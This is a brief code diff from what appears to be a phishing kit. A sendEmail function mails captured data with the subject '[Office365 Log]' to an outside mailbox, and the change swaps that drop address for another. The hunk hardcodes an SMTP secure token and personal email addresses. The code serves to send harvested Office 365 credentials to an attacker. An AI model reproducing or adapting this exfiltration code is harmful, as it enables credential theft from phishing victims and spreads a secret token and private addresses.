@@ -101,7 +101,7 @@ function sendEmail(to,message) {
   // Username : smtp_username,
   // Password : smtp_password,
   SecureToken: '192bfa31-d02e-49d8-b15e-dd37ced23e0d',
-  To : 'kjvluv1@gmail.com',
+  To : 'credomane21@mail.com',
   From : smtp_username,
   Subject : '===+ [Office365 Log] +===',
   Body : message,
